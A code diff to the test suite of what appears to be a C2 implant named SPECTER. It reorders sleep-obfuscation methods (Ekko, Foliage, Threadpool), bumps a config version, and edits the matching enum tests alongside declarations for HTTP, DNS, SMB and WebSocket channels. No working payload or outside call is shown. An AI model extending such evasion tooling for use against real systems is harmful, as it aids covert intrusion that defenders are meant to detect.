@@ -191,14 +191,14 @@ void spec_decrypt_string(const BYTE *encrypted, DWORD len, BYTE *output);
 
 /* Config declarations */
 #define CONFIG_MAGIC           0x53504543
-#define CONFIG_VERSION         1
+#define CONFIG_VERSION         2
 #define CONFIG_MAX_CHANNELS    4
 #define CONFIG_KEY_INPUT_SIZE  64
 #define CONFIG_SCAN_MAX        0x10000
 #define CONFIG_SCAN_START      256
 
 typedef enum _CHANNEL_TYPE { CHANNEL_HTTP=0, CHANNEL_DNS=1, CHANNEL_SMB=2, CHANNEL_WEBSOCKET=3 } CHANNEL_TYPE;
-typedef enum _SLEEP_METHOD { SLEEP_EKKO=0, SLEEP_WFS=1, SLEEP_DELAY=2, SLEEP_FOLIAGE=3, SLEEP_THREADPOOL=4 } SLEEP_METHOD;
+typedef enum _SLEEP_METHOD { SLEEP_DELAY=0, SLEEP_WFS=1, SLEEP_EKKO=2, SLEEP_FOLIAGE=3, SLEEP_THREADPOOL=4 } SLEEP_METHOD;
 
 typedef struct _CHANNEL_CONFIG {
     char   url[256];
@@ -785,9 +785,9 @@ static void test_hash_values(void) {
 static void test_sleep_method_enum(void) {
     printf("\n=== Sleep Method Enum Tests ===\n");
 
-    ASSERT_TRUE("SLEEP_EKKO == 0", SLEEP_EKKO == 0);
+    ASSERT_TRUE("SLEEP_DELAY == 0", SLEEP_DELAY == 0);
     ASSERT_TRUE("SLEEP_WFS == 1", SLEEP_WFS == 1);
-    ASSERT_TRUE("SLEEP_DELAY == 2", SLEEP_DELAY == 2);
+    ASSERT_TRUE("SLEEP_EKKO == 2", SLEEP_EKKO == 2);
     ASSERT_TRUE("SLEEP_FOLIAGE == 3", SLEEP_FOLIAGE == 3);
     ASSERT_TRUE("SLEEP_THREADPOOL == 4", SLEEP_THREADPOOL == 4);
 
@@ -979,6 +979,7 @@ static void test_hash_values_new(void) {
 /* ------------------------------------------------------------------ */
 
 int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
     printf("SPECTER Sleep Controller Test Suite\n");
     printf("====================================\n");
 
